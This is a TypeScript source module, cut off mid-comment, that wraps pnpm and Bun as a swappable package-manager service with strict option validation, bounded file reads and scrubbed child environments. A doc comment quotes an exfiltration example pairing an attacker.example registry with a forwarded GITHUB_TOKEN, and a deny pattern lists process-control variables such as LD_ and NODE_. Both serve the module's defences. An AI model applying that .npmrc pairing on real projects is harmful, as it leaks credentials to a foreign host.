/**
 * The package-manager seam.
 *
 * Installing dependencies has two distinct jobs.
 * Fetching populates a content-addressed store under `.flows/store`;
 * linking materializes one project's `node_modules` out of that store.
 * The first has stable identity from declared package-manager inputs, but the
 * current absolute-root implementation is deliberately not shared across
 * runs because it cannot freeze those files across a child-process open. The
 * second writes a local tree of hardlinks, symlinks, or copies, so it is never
 * restored from another machine either.
 *
 * This module is the `Layer` that decides which manager performs those two
 * jobs. It holds no flow vocabulary: `Install.ts` declares the actions and the
 * flow, and provides them over whichever implementation a composition picks.
 * Selecting Bun rather than pnpm is a layer swap, exactly as
 * `docs/specs/Specs/Object Model.md` requires of every host-facing service.
 *
 * Host access is Effect's own: `effect/unstable/process/ChildProcessSpawner`
 * for commands and `effect/FileSystem` for reads. The platform arrives as a
 * layer construction option rather than from `globalThis.process`, because
 * this module has to stay browser-bundleable even though the managers it
 * drives do not.
 *
 * @since 0.1.0
 */

import { Sha256 } from "@smthrs/crypto"
import * as Context from "effect/Context"
import type * as Crypto from "effect/Crypto"
import * as Effect from "effect/Effect"
import * as FileSystem from "effect/FileSystem"
import * as Layer from "effect/Layer"
import * as Option from "effect/Option"
import * as Schema from "effect/Schema"
import * as ChildProcess from "effect/unstable/process/ChildProcess"
import { ChildProcessSpawner } from "effect/unstable/process/ChildProcessSpawner"
import * as BoundedOutput from "./internal/boundedOutput.ts"
import * as Diagnostics from "./internal/diagnostic.ts"
import { normalizePlatform } from "./internal/platform.ts"
import * as Validate from "./internal/validate.ts"
import * as Runtime from "./Runtime.ts"

/**
 * Schema for the supported package managers.
 *
 * The set matches the declared `PackageManager` union in `@smthrs/targets`:
 * a manager this service can measure is a manager a legacy declaration file can declare.
 *
 * @category models
 * @since 0.1.0
 * @slop
 */
export const Name = Schema.Literals(["pnpm", "bun"])

/**
 * The supported package managers.
 *
 * @category models
 * @since 0.1.0
 * @slop
 */
export type Name = typeof Name.Type

/**
 * Schema for the host facts a manager's store artifacts can vary by.
 *
 * The platform is the runtime's fact, not the manager's. This is an alias so a
 * store manifest can name it without this module keeping a second definition
 * that could drift from the one the `Runtime` service reports.
 *
 * @category models
 * @since 0.1.0
 * @slop
 */
export const Platform = Runtime.Platform

/**
 * The host facts a manager's store artifacts can vary by.
 *
 * @category models
 * @since 0.1.0
 * @slop
 */
export type Platform = Runtime.Platform

/**
 * Schema for the bounded description of a host failure an error carries.
 *
 * An alias of {@link Runtime.Diagnostic} for the same reason {@link Platform}
 * is an alias: two definitions of one shape drift, and this one is folded into
 * a journaled error.
 *
 * @category models
 * @since 0.1.0
 */
export const Diagnostic = Runtime.Diagnostic

/**
 * The bounded description of a host failure an error carries.
 *
 * @category models
 * @since 0.1.0
 */
export type Diagnostic = Runtime.Diagnostic

/**
 * Schema for a content digest produced by this module.
 *
 * @category models
 * @since 0.1.0
 * @slop
 */
export const Digest = Sha256.Digest

/**
 * A content digest produced by this module.
 *
 * @category models
 * @since 0.1.0
 * @slop
 */
export type Digest = typeof Sha256.Digest.Type

/**
 * Schema for the stable error codes a manager operation reports.
 *
 * @category models
 * @since 0.1.0
 * @slop
 */
export const ErrorCode = Schema.Literals([
  "command_failed",
  "environment_mismatch",
  "input_drift",
  "lockfile_unreadable",
  "manifest_unreadable",
  "unsafe_configuration",
  "unsupported"
])

/**
 * The stable error codes a manager operation reports.
 *
 * @category models
 * @since 0.1.0
 * @slop
 */
export type ErrorCode = typeof ErrorCode.Type

/**
 * Error raised by a package-manager operation.
 *
 * The identity string is frozen: it is journaled and folded into recorded
 * results, so renaming it invalidates cached work.
 *
 * @category errors
 * @since 0.1.0
 * @slop
 */
export class PackageManagerError extends Schema.TaggedError<PackageManagerError>()(
  "smithers-build/PackageManagerError",
  {
    code: ErrorCode,
    message: Schema.String,
    cause: Schema.optional(Diagnostic)
  }
) {}

/**
 * Schema for what a fetch produced: a description of the store population, and
 * never the bytes.
 *
 * The digest is machine-independent on purpose. It names the fetch's inputs,
 * not a host-specific store directory, so two machines that fetched the same
 * lockfile under the same manager agree on it. The current expected boundary
 * does not publish this value or the store files across runs.
 *
 * @category models
 * @since 0.1.0
 * @slop
 */
export const StoreManifest = Schema.Struct({
  /** The manager whose store was populated. */
  manager: Name,
  /** The exact manager version that populated it. */
  managerVersion: Schema.NonEmptyString,
  /** The platform the store was populated for, or `null` when irrelevant. */
  platform: Schema.NullOr(Platform),
  /** The digest of the canonical manifest text. */
  digest: Digest
})

/**
 * What a fetch produced.
 *
 * @category models
 * @since 0.1.0
 * @slop
 */
export type StoreManifest = typeof StoreManifest.Type

/**
 * The workspace-relative root of every package-manager store.
 *
 * Fetch writes beneath this path so its declared write set is exact. Link
 * reads the store locally and writes `node_modules`; neither tree is currently
 * published.
 *
 * A store the workspace owns is a store no sibling checkout links out of, so
 * each clone or worktree downloads and unpacks the whole dependency set again
 * and keeps its own copy. {@link Options.storeDirectory} names a host store
 * instead, for a composition that drives a manager outside the install Flow.
 *
 * @category constants
 * @since 0.1.0
 * @slop
 */
export const storeRoot = ".flows/store"

/**
 * The project hook files pnpm loads by default, in its own order: the first
 * one present is the only one loaded.
 *
 * The install flow measures that file and every pnpm command names it with
 * `--pnpmfile`, so a `pnpmfile` or `globalPnpmfile` setting the measurement
 * never saw cannot add another. With neither present, hooks are disabled.
 *
 * @category constants
 * @since 1.0.0
 */
export const pnpmfileNames = [".pnpmfile.mjs", ".pnpmfile.cjs"] as const

/**
 * The first default pnpm hook file present in a project, if any.
 *
 * @category constructors
 * @since 1.0.0
 */
export const pnpmfileOf = (
  projectRoot: string
): Effect.Effect<(typeof pnpmfileNames)[number] | null, PackageManagerError, FileSystem.FileSystem> =>
  Effect.gen(function*() {
    const fs = yield* FileSystem.FileSystem
    for (const name of pnpmfileNames) {
      const present = yield* fs.exists(`${projectRoot}/${name}`).pipe(
        Effect.mapError((cause) =>
          new PackageManagerError({
            code: "manifest_unreadable",
            message: `cannot inspect ${name}`,
            cause: Diagnostics.diagnostic(cause)
          })
        )
      )
      if (present) return name
    }
    return null
  })

/**
 * Maximum bytes admitted from one project `.npmrc` file.
 *
 * @category constants
 * @since 0.1.0
 * @slop
 */
export const maximumNpmrcBytes = 256 * 1024
/**
 * Maximum bytes admitted from one project package manifest.
 *
 * @category constants
 * @since 0.1.0
 * @slop
 */
export const maximumPackageJsonBytes = 4 * 1024 * 1024
/**
 * Maximum bytes admitted from one package-manager lockfile.
 *
 * @category constants
 * @since 0.1.0
 * @slop
 */
export const maximumLockfileBytes = 64 * 1024 * 1024
/**
 * Maximum stdout bytes accepted from a package-manager version probe.
 *
 * The same constant the runtime probe applies, re-exported rather than
 * redeclared: two exported names for one bound, with one of them enforced, is
 * how the runtime probe ended up documented as bounded and running unbounded.
 *
 * @category constants
 * @since 0.1.0
 * @slop
 */
export const maximumVersionOutputBytes = Runtime.maximumVersionOutputBytes
/**
 * Default wall-clock timeout for one package-manager subprocess.
 *
 * @category constants
 * @since 0.1.0
 * @slop
 */
export const defaultCommandTimeoutMs = 30 * 60 * 1000
/**
 * Maximum configurable wall-clock timeout for one package-manager subprocess.
 *
 * @category constants
 * @since 0.1.0
 * @slop
 */
export const maximumCommandTimeoutMs = 24 * 60 * 60 * 1000

/**
 * The two-verb contract every manager implements.
 *
 * @category models
 * @since 0.1.0
 * @slop
 */
export interface Service {
  /** Which manager this is. */
  readonly name: Name
  /** Absolute project root every filesystem read and child process is anchored to. */
  readonly projectRoot: string
  /**
   * The store directory this manager writes: workspace-relative below
   * {@link storeRoot} by default, or the absolute host path
   * {@link Options.storeDirectory} named. Only the default matches what the
   * install Flow's fetch boundary declares.
   */
  readonly storeDirectory: string
  /** The lockfile this manager reads, relative to the project root. */
  readonly lockfileName: string
  /**
   * Whether the set of artifacts a fetch downloads varies by host platform.
   *
   * True for every manager implemented here: optional dependencies resolve
   * per platform, so the fetched set does, even where the store's addressing
   * does not. A manager whose fetch is platform-independent sets this false
   * and drops the platform out of its key material.
   */
  readonly platformSensitive: boolean
  /** The version the workspace declared it requires. */
  readonly requirement: string
  /** The exact manager version, measured once per live service instance. */
  readonly version: Effect.Effect<string, PackageManagerError>
  /**
   * Measures the host manager and fails when it does not satisfy
   * {@link Service.requirement}.
   *
   * Fetch and link both call this first. It replaces the old cross-round
   * environment recheck: there is no longer a measured value to compare a
   * later round against, only a declaration to hold the host to.
   */
  readonly verify: Effect.Effect<string, PackageManagerError>
  /**
   * Populates the content-addressed store from the lockfile alone. pnpm also
   * writes its virtual store (`node_modules/.pnpm`) and `.modules.yaml`, but
   * links no package into the project's `node_modules`.
   */
  readonly fetch: Effect.Effect<void, PackageManagerError>
  /**
   * Materializes `node_modules` from the already-populated store, offline
   * where the manager supports it.
   */
  readonly link: Effect.Effect<void, PackageManagerError>
  /**
   * Digests the evidence this manager leaves behind describing the linked
   * tree. This is the node_modules manifest digest: never the tree itself.
   */
  readonly linkManifest: Effect.Effect<Digest, PackageManagerError, Crypto.Crypto>
}

/**
 * The package-manager service tag.
 *
 * @category services
 * @since 0.1.0
 * @slop
 */
export class PackageManager extends Context.Service<PackageManager, Service>()(
  "smithers-build/PackageManager"
) {}

/**
 * Layer construction options shared by every implementation.
 *
 * @category models
 * @since 0.1.0
 * @slop
 */
export interface Options {
  /**
   * The absolute project root used as every manager command's cwd and every
   * package-manager file read's base. Keeping it in the service avoids any
   * process-wide `chdir`, so independent installs can run concurrently.
   */
  readonly projectRoot: string
  /**
   * The manager version the workspace declared. The layer holds the host to
   * it; it never reports a measurement in its place.
   */
  readonly requirement: string
  /**
   * Host environment capability. Implementations select only process-startup
   * variables, network routing, and variables the project `.npmrc` names as the
   * whole value of a registry-scoped credential setting; the complete object is
   * never inherited by a child. Relative `PATH` entries are dropped.
   *
   * Because it is the host's environment, its names are held to the host's own
   * rule rather than to the portable one. Windows names `ProgramFiles(x86)`,
   * and a lookup table is not a declaration.
   */
  readonly environment?: Readonly<Record<string, string | undefined>> | undefined
  /** Wall-clock deadline for each fetch or link command. */
  readonly timeoutMs?: number | undefined
  /**
   * The manager executable, when it is not on `PATH` under its own name.
   */
  readonly executable?: string | undefined
  /**
   * An absolute host directory holding the manager's content-addressable
   * store, outside {@link Options.projectRoot}.
   *
   * Omitted, every manager stores beneath the workspace-local
   * {@link storeRoot}, which is the only layout the install Flow admits: its
   * fetch action declares that fixed workspace-relative tree as its write set,
   * and a file set names no host path. The cost of that default is a complete
   * download and unpack per clone or worktree, because a store one workspace
   * owns is a store no other workspace links out of.
   *
   * A composition that drives the manager directly can name a host store here
   * and get the manager's own model back: one machine-wide store every
   * checkout hardlinks from. The install Flow's fetch refuses such a service
   * rather than declaring one path and writing another.
   */
  readonly storeDirectory?: string | undefined
  /**
   * Registry hosts a project `.npmrc` may bind a host credential to.
   *
   * A `//host/path/:_authToken=${NAME}` setting names its own host, and the
   * repository writes that line. Without this list a checkout could pair
   * `registry=https://attacker.example/` with
   * `//attacker.example/:_authToken=${GITHUB_TOKEN}` and pnpm would send the
   * host variable there. A placeholder under any other host is refused with
   * `unsafe_configuration` before a child starts. Entries are `host` or
   * `host:port`, compared case-insensitively against the setting's authority.
   *
   * Defaults to {@link defaultCredentialHosts}. An empty list forwards no
   * credential.
   */
  readonly credentialHosts?: ReadonlyArray<string> | undefined
}

/**
 * The registry hosts a project `.npmrc` may bind a credential to when
 * {@link Options.credentialHosts} is omitted.
 *
 * @category constants
 * @since 0.1.0
 * @slop
 */
export const defaultCredentialHosts: ReadonlyArray<string> = Object.freeze(["registry.npmjs.org"])

/** @private */
const failedToStart = (label: string, cause: unknown): PackageManagerError =>
  new PackageManagerError({
    code: "command_failed",
    message: `${label} failed: ${failureMessage(cause)}`,
    cause: Diagnostics.diagnostic(cause)
  })

/** @private */
const failedToRun = (label: string, code: number): PackageManagerError =>
  new PackageManagerError({
    code: "command_failed",
    message: `${label} exited with status ${code}`
  })

/** @private */
const failedToFinish = (label: string, timeoutMs: number): PackageManagerError =>
  new PackageManagerError({
    code: "command_failed",
    message: `${label} did not finish within ${timeoutMs}ms`
  })

/** @private */
const unreadable = (
  code: ErrorCode,
  path: string,
  cause: unknown
): PackageManagerError =>
  new PackageManagerError({
    code,
    message: `could not read ${path}: ${failureMessage(cause)}`,
    cause: Diagnostics.diagnostic(cause)
  })

/** @private */
const failureMessage = (cause: unknown): string => {
  if (typeof cause === "string") return cause === "" ? "unknown failure" : cause
  if (
    typeof cause === "number" ||
    typeof cause === "bigint" ||
    typeof cause === "boolean" ||
    typeof cause === "symbol"
  ) return String(cause)
  if ((typeof cause !== "object" && typeof cause !== "function") || cause === null) return "unknown failure"
  try {
    const descriptor = Object.getOwnPropertyDescriptor(cause, "message")
    if (
      descriptor !== undefined && "value" in descriptor && typeof descriptor.value === "string" &&
      descriptor.value !== ""
    ) return descriptor.value
    // Platform errors may derive `message` from their prototype. They are
    // real Errors, but have no own message descriptor, so the previous path
    // reported only "unknown failure" for a failed Windows child process.
    if (cause instanceof Error && typeof cause.message === "string" && cause.message !== "") {
      return cause.message.slice(0, 2_048)
    }
    return "unknown failure"
  } catch {
    return "unknown failure"
  }
}

const bootstrapEnvironment = [
  "HTTP_PROXY",
  "HTTPS_PROXY",
  "NO_PROXY",
  "PATH",
  "PATHEXT",
  "SSL_CERT_DIR",
  "SSL_CERT_FILE",
  "SYSTEMROOT",
  "TEMP",
  "TMP",
  "TMPDIR",
  "WINDIR",
  "http_proxy",
  "https_proxy",
  "no_proxy"
] as const

const timeoutOf = (value: unknown): number => {
  const timeout = value ?? defaultCommandTimeoutMs
  if (
    typeof timeout !== "number" ||
    !Number.isSafeInteger(timeout) ||
    timeout < 1 ||
    timeout > maximumCommandTimeoutMs
  ) {
    throw new TypeError(
      `package-manager timeout must be an integer from 1 to ${maximumCommandTimeoutMs}, received ${
        typeof timeout === "number" ? String(timeout) : typeof timeout
      }`
    )
  }
  return timeout
}

interface NormalizedOptions {
  readonly projectRoot: string
  readonly platform: Platform
  readonly requirement: string
  readonly environment: ReadonlyMap<string, string>
  readonly timeoutMs: number
  readonly executable: string | undefined
  readonly storeDirectory: string | undefined
  readonly credentialHosts: ReadonlySet<string>
}

/** Validates the operator's credential host list into a lower-cased set. */
const credentialHostsOf = (value: unknown): ReadonlySet<string> => {
  if (value === undefined) return new Set(defaultCredentialHosts)
  if (!Array.isArray(value) || value.length > 64) {
    throw new TypeError("package-manager credentialHosts must be an array of at most 64 hosts")
  }
  const hosts = new Set<string>()
  for (let index = 0; index < value.length; index += 1) {
    const descriptor = Object.getOwnPropertyDescriptor(value, String(index))
    const host = descriptor !== undefined && "value" in descriptor ? descriptor.value : undefined
    if (typeof host !== "string" || !/^[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?(?::[0-9]{1,5})?$/.test(host)) {
      throw new TypeError("package-manager credentialHosts must contain only host or host:port names")
    }
    hosts.add(host.toLowerCase())
  }
  return hosts
}

/**
 * Snapshots and validates host configuration before any service or child exists.
 *
 * The platform arrives as an argument rather than an option because it belongs
 * to the `Runtime` service. Validating it here anyway keeps the invariant local:
 * this module never builds a command from a platform it has not checked.
 */
const normalizeOptions = (value: Options, hostPlatform: Platform): NormalizedOptions => {
  const options = Validate.plainRecord(value, "package-manager options")
  Validate.exactKeys(
    options,
    new Set([
      "projectRoot",
      "requirement",
      "environment",
      "timeoutMs",
      "executable",
      "storeDirectory",
      "credentialHosts"
    ]),
    "package-manager options"
  )
  const root = Validate.ownData(options, "projectRoot", "package-manager options")
  if (
    typeof root !== "string" ||
    root.length === 0 ||
    root.includes("\0") ||
    !Validate.isWellFormedText(root) ||
    Buffer.byteLength(root, "utf8") > 32 * 1024 ||
    !/^(?:\/|[A-Za-z]:[\\/]|\\\\)/.test(root)
  ) {
    throw new TypeError("package-manager projectRoot must be a usable absolute path")
  }
  const requirement = Validate.ownData(options, "requirement", "package-manager options")
  if (
    typeof requirement !== "string" ||
    requirement.length === 0 ||
    requirement.includes("\0") ||
    !Validate.isWellFormedText(requirement) ||
    Buffer.byteLength(requirement, "utf8") > 256
  ) {
    throw new TypeError("package-manager requirement must be non-empty usable text no longer than 256 bytes")
  }
  const normalizedPlatform = normalizePlatform(hostPlatform, "package-manager platform")
  const executable = Validate.ownData(options, "executable", "package-manager options")
  if (
    executable !== undefined &&
    (typeof executable !== "string" || executable.length === 0 || executable.includes("\0") ||
      !Validate.isWellFormedText(executable) || Buffer.byteLength(executable, "utf8") > 32 * 1024)
  ) {
    throw new TypeError("package-manager executable must be usable non-empty text")
  }
  const store = Validate.ownData(options, "storeDirectory", "package-manager options")
  if (
    store !== undefined &&
    (typeof store !== "string" || store.length === 0 || store.includes("\0") ||
      !Validate.isWellFormedText(store) || Buffer.byteLength(store, "utf8") > 32 * 1024 ||
      !/^(?:\/|[A-Za-z]:[\\/]|\\\\)/.test(store))
  ) {
    throw new TypeError("package-manager storeDirectory must be a usable absolute path")
  }
  // A store the project root contains is the default in disguise: it dies with
  // the checkout, which is the reuse this option exists to restore.
  if (store !== undefined && insideRoot(root, store)) {
    throw new TypeError("package-manager storeDirectory must be outside the project root")
  }
  const timeoutMs = timeoutOf(Validate.ownData(options, "timeoutMs", "package-manager options"))
  return Object.freeze({
    projectRoot: root,
    platform: normalizedPlatform,
    requirement,
    environment: Validate.normalizeEnvironment(
      Validate.ownData(options, "environment", "package-manager options"),
      normalizedPlatform.os === "win32",
      "package-manager environment"
    ),
    timeoutMs,
    executable,
    storeDirectory: store,
    credentialHosts: credentialHostsOf(Validate.ownData(options, "credentialHosts", "package-manager options"))
  })
}

/**
 * Keeps only the absolute directories of a search path.
 *
 * A relative or empty entry names the child's cwd, which is the project root:
 * a repository could plant the executable it resolves to.
 */
const absoluteSearchPath = (value: string, windows: boolean): string =>
  value.split(windows ? ";" : ":").filter((component) => {
    const directory = windows ? component.replace(/^"(.*)"$/, "$1") : component
    return windows ? /^(?:\/|[A-Za-z]:[\\/]|\\\\)/.test(directory) : directory.startsWith("/")
  }).join(windows ? ";" : ":")

/** Variables that can mutate the runtime or package-manager command itself. */
const unsafeReferencedEnvironmentName = (name: string): boolean =>
  /^(?:BASH_ENV|BUN_.+|CDPATH|COREPACK_.+|DENO_.+|DYLD_.+|ENV|GIT_.+|GLOBIGNORE|LD_.+|NODE_.+|NPM_CONFIG_.+|PNPM_.+|SHELLOPTS)$/i
    .test(
      name
    )

const fileIdentity = (info: FileSystem.File.Info): string =>
  `${info.dev}:${Option.getOrUndefined(info.ino) ?? "none"}:${info.size}:` +
  `${Option.getOrUndefined(info.mtime)?.getTime() ?? "none"}`

const comparablePath = (path: string): string => {
  const normalized = path.replaceAll("\\", "/")
  return /^(?:[A-Za-z]:\/|\/\/)/.test(normalized) ? normalized.toLowerCase() : normalized
}

const insideRoot = (root: string, candidate: string): boolean => {
  const boundary = comparablePath(root)
  const path = comparablePath(candidate)
  return path === boundary || path.startsWith(boundary.endsWith("/") ? boundary : `${boundary}/`)
}

/** Reads one descriptor-stable regular file while enforcing an actual byte limit. */
const boundedBytes = (
  fs: FileSystem.FileSystem,
  code: ErrorCode,
  projectRoot: string,
  path: string,
  limit: number
): Effect.Effect<Uint8Array, PackageManagerError> =>
  Effect.scoped(
    Effect.gen(function*() {
      const canonicalRoot = yield* fs.realPath(projectRoot).pipe(
        Effect.mapError((cause) => unreadable(code, projectRoot, cause))
      )
      const canonicalPath = yield* fs.realPath(path).pipe(
        Effect.mapError((cause) => unreadable(code, path, cause))
      )
      if (!insideRoot(canonicalRoot, canonicalPath)) {
        return yield* Effect.fail(
          unreadable(code, path, new Error(`file resolves outside project root ${canonicalRoot}`))
        )
      }
      // Reject stable FIFOs, sockets, devices, and directories before open;
      // opening a FIFO for reading can otherwise wait forever for a writer.
      const before = yield* fs.stat(path).pipe(Effect.mapError((cause) => unreadable(code, path, cause)))
      if (before.type !== "File" || before.size > BigInt(limit)) {
        return yield* Effect.fail(
          unreadable(code, path, new Error(`expected a regular file no larger than ${limit} bytes`))
        )
      }
      const file = yield* fs.open(path, { flag: "r" }).pipe(
        Effect.mapError((cause) => unreadable(code, path, cause))
      )
      const info = yield* file.stat.pipe(Effect.mapError((cause) => unreadable(code, path, cause)))
      if (info.type !== "File" || info.size > BigInt(limit)) {
        return yield* Effect.fail(
          unreadable(code, path, new Error(`expected a regular file no larger than ${limit} bytes`))
        )
      }
      if (fileIdentity(before) !== fileIdentity(info)) {
        return yield* Effect.fail(unreadable(code, path, new Error("file changed while it was opened")))
      }
      const advertised = Number(info.size)
      const bytes = new Uint8Array(advertised + 1)
      let length = 0
      while (length < bytes.byteLength) {
        const destination = bytes.subarray(length)
        const read = Number(
          yield* file.read(destination).pipe(
            Effect.mapError((cause) => unreadable(code, path, cause))
          )
        )
        if (!Number.isSafeInteger(read) || read < 0 || read > destination.byteLength) {
          return yield* Effect.fail(unreadable(code, path, new Error("file returned an invalid read length")))
        }
        if (read === 0) break
        length += read
      }
      if (length > limit || BigInt(length) !== info.size) {
        return yield* Effect.fail(unreadable(code, path, new Error("file length changed while it was read")))
      }
      const after = yield* file.stat.pipe(Effect.mapError((cause) => unreadable(code, path, cause)))
      if (fileIdentity(info) !== fileIdentity(after)) {
        return yield* Effect.fail(unreadable(code, path, new Error("file changed while it was read")))
      }
      const canonicalPathAfter = yield* fs.realPath(path).pipe(
        Effect.mapError((cause) => unreadable(code, path, cause))
      )
      const canonicalRootAfter = yield* fs.realPath(projectRoot).pipe(
        Effect.mapError((cause) => unreadable(code, projectRoot, cause))
      )
      if (
        comparablePath(canonicalRootAfter) !== comparablePath(canonicalRoot) ||
        comparablePath(canonicalPathAfter) !== comparablePath(canonicalPath) ||
        !insideRoot(canonicalRootAfter, canonicalPathAfter)
      ) {
        return yield* Effect.fail(unreadable(code, path, new Error("file changed its canonical location while read")))
      }
      return bytes.subarray(0, length)
    })
  )

const boundedText = (
  fs: FileSystem.FileSystem,
  code: ErrorCode,
  projectRoot: string,
  path: string,
  limit: number
): Effect.Effect<string, PackageManagerError> =>
  boundedBytes(fs, code, projectRoot, path, limit).pipe(
    Effect.flatMap((bytes) =>
      Effect.try({
        try: () => BoundedOutput.decodedText(bytes, path),
        catch: (cause) => unreadable(code, path, cause)
      })
    )
  )

/**
 * `.npmrc` settings that choose where, or how safely, a request travels.
 *
 * With a forwarded credential, a repository-chosen proxy receives the
 * credential (in cleartext for an `http:` registry), and a repository CA or
 * `strict-ssl=false` lets a server it chose impersonate the allowed host.
 */
const transportSetting = /^(?:proxy|https?-proxy|no-?proxy|strict-ssl|ca|cafile|cert|local-address)$/i

/** A `registry` or `@scope:registry` setting. */
const registrySetting = /^(?:@[^:]+:)?registry$/i

/**
 * The environment and transport pins a pnpm child runs with.
 *
 * `transportArgs` is empty unless `.npmrc` forwards a credential. Then it pins
 * every proxy, TLS, and CA setting on the command line, which outranks both
 * `.npmrc` and `pnpm-workspace.yaml` (pnpm 10 reads `httpsProxy`, `httpProxy`,
 * and `strictSsl` from the latter). The proxies are the operator's own
 * `HTTPS_PROXY`, `HTTP_PROXY`, and `NO_PROXY`, or none.
 */
interface ManagerEnvironment {
  readonly env: Record<string, string>
  readonly transportArgs: ReadonlyArray<string>
}

/** Selects only bootstrap, network, and project-declared credential variables. */
const managerEnvironment = (
  fs: FileSystem.FileSystem,
  options: NormalizedOptions
): Effect.Effect<ManagerEnvironment, PackageManagerError> =>
  Effect.gen(function*() {
    const source = options.environment
    const path = `${options.projectRoot}/.npmrc`
    const present = yield* fs.exists(path).pipe(
      Effect.mapError((cause) => unreadable("manifest_unreadable", path, cause))
    )
    const npmrc = parseNpmrc(
      present
        ? yield* boundedText(fs, "manifest_unreadable", options.projectRoot, path, maximumNpmrcBytes)
        : ""
    )
    yield* refuseUnsafeNpmrc(path, npmrc)
    // After the refusal every live placeholder is the whole value of a
    // registry-scoped credential setting, so these are the only names a
    // project `.npmrc` can pull from the host. The setting's host is the
    // repository's choice, so it must also be one the operator allowed.
    const referenced = new Set<string>()
    for (const [name, value] of npmrc) {
      const match = /^\$\{([A-Za-z_][A-Za-z0-9_]*)\}$/.exec(value)
      if (match === null) continue
      const host = /^\/\/([^/\s]+)\//.exec(name)?.[1]?.toLowerCase()
      if (host === undefined || !options.credentialHosts.has(host)) {
        return yield* Effect.fail(
          new PackageManagerError({
            code: "unsafe_configuration",
            message: `${path} setting ${name} binds a credential to a registry host outside credentialHosts`
          })
        )
      }
      referenced.add(match[1]!)
    }
    if (referenced.size > 0) {
      for (const [name, value] of npmrc) {
        if (transportSetting.test(name) || (registrySetting.test(name) && !/^https:\/\//i.test(value))) {
          return yield* Effect.fail(
            new PackageManagerError({
              code: "unsafe_configuration",
              message: `${path} setting ${name} changes how a forwarded credential travels; ` +
                "with a credential placeholder, registries must be https and proxy and TLS settings come from the host"
            })
          )
        }
      }
    }
    const windows = options.platform.os === "win32"
    // A null prototype, because the loop below decides what to forward by
    // asking whether a name is already set. On an object literal every
    // `Object.prototype` name answers that question wrongly: a `.npmrc`
    // legitimately referencing `${constructor}` or `${toString}` reads as
    // already present and is silently dropped rather than forwarded.
    const env: Record<string, string> = Object.create(null)
    Object.assign(env, {
      CI: "true",
      CLICOLOR: "0",
      FORCE_COLOR: "0",
      LANG: "C",
      LC_ALL: "C",
      NO_COLOR: "1",
      NPM_CONFIG_GLOBALCONFIG: windows ? "NUL" : "/dev/null",
      NPM_CONFIG_USERCONFIG: windows ? "NUL" : "/dev/null"
    })
    for (const name of referenced) {
      if (unsafeReferencedEnvironmentName(name)) {
        return yield* Effect.fail(
          new PackageManagerError({
            code: "unsafe_configuration",
            message: `${path} references process-control environment variable ${name}`
          })
        )
      }
    }
    for (const name of [...bootstrapEnvironment, ...referenced]) {
      const value = Validate.sourceValue(source, name, windows)
      if (value !== undefined && !Object.hasOwn(env, name)) env[name] = value
    }
    // The child runs with the project root as its cwd, so a relative or empty
    // `PATH` entry would resolve `pnpm` (and anything pnpm spawns) to a file
    // the repository planted.
    // An empty `PATH` is itself one empty entry, so it is removed, not kept.
    if (Object.hasOwn(env, "PATH")) {
      const search = absoluteSearchPath(env.PATH!, windows)
      if (search === "") delete env.PATH
      else env.PATH = search
    }
    if (referenced.size === 0) return { env, transportArgs: [] }
    const hostValue = (...names: ReadonlyArray<string>) =>
      names.map((name) => Validate.sourceValue(source, name, windows)).find((value) => value !== undefined) ?? ""
    const httpsProxy = hostValue("HTTPS_PROXY", "https_proxy")
    return {
      env,
      transportArgs: [
        "--config.proxy=",
        `--config.https-proxy=${httpsProxy}`,
        `--config.http-proxy=${hostValue("HTTP_PROXY", "http_proxy") || httpsProxy}`,
        `--config.noproxy=${hostValue("NO_PROXY", "no_proxy")}`,
        "--config.strict-ssl=true",
        "--config.ca="
      ]
    }
  })

/** Constructs a child that receives only explicitly selected capabilities. */
const managerCommand = (
  executable: string,
  args: ReadonlyArray<string>,
  projectRoot: string,
  environment: Record<string, string>,
  output: "capture" | "inherit"
): ChildProcess.Command =>
  ChildProcess.make(executable, args, {
    cwd: projectRoot,
    env: environment,
    extendEnv: false,
    stdin: "ignore",
    stdout: output === "capture" ? "pipe" : "inherit",
    stderr: "inherit",
    killSignal: "SIGKILL"
  })

/**
 * Runs a command and refuses a non-zero status.
 *
 * @private
 */
const run = (
  spawner: ChildProcessSpawner["Service"],
  label: string,
  command: ChildProcess.Command,
  timeoutMs: number
): Effect.Effect<void, PackageManagerError> =>
  spawner.exitCode(command).pipe(
    Effect.mapError((cause) => failedToStart(label, cause)),
    Effect.timeoutOrElse({
      duration: timeoutMs,
      orElse: () => Effect.fail(failedToFinish(label, timeoutMs))
    }),
    Effect.flatMap((status) => status === 0 ? Effect.void : Effect.fail(failedToRun(label, status)))
  )

/**
 * Runs a command and returns its trimmed standard output.
 *
 * @private
 */
const capture = (
  spawner: ChildProcessSpawner["Service"],
  label: string,
  command: ChildProcess.Command,
  timeoutMs: number
): Effect.Effect<string, PackageManagerError> =>
  Effect.scoped(
    Effect.flatMap(spawner.spawn(command), (handle) =>
      Effect.all([BoundedOutput.boundedOutput(handle.stdout), handle.exitCode], { concurrency: "unbounded" }))
  ).pipe(
    Effect.mapError((cause) =>
      failedToStart(label, cause)
    ),
    Effect.timeoutOrElse({
      duration: Math.min(timeoutMs, 30_000),
      orElse: () => Effect.fail(failedToFinish(label, Math.min(timeoutMs, 30_000)))
    }),
    Effect.flatMap(([output, status]) =>
      status === 0 ? Effect.succeed(output) : Effect.fail(failedToRun(label, status))
    ),
    Effect.flatMap((output) =>
      Effect.try({
        try: () => {
          const text = BoundedOutput.decodedText(output, `${label} stdout`).trim()
          if (text === "") throw new Error(`${label} returned an empty version`)
          if (/\r|\n|[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/.test(text)) {
            throw new Error(`${label} returned more than one line or control characters`)
          }
          return text
        },
        catch: (cause) => failedToStart(label, cause)
      })
    )
  )

/**
 * Digests text with the injected `Crypto` service.
 *
 * @private
 */
const digestText = (text: string): Effect.Effect<Digest, never, Crypto.Crypto> =>
  Effect.orDie(Schema.decodeUnknownEffect(Sha256)(text))

/**
 * Digests a file's contents, reporting an unreadable file as a typed failure
 * rather than a defect.
 *
 * @private
 */
const digestFile = (
  fs: FileSystem.FileSystem,
  code: ErrorCode,
  projectRoot: string,
  path: string,
  limit: number
): Effect.Effect<Digest, PackageManagerError, Crypto.Crypto> =>
  boundedBytes(fs, code, projectRoot, path, limit).pipe(
    Effect.flatMap((bytes) => Effect.orDie(Schema.decodeUnknownEffect(Sha256)(bytes)))
  )

/**
 * Holds the host manager to the version the workspace declared.
 *
 * This is the whole of what the old cross-round environment recheck did that
 * still matters. That check compared a measurement against an earlier
 * measurement of the same host, which could only catch a change mid-run; this
 * compares the host against the declaration, which catches the case that
 * actually breaks a build: a machine running a manager the workspace never
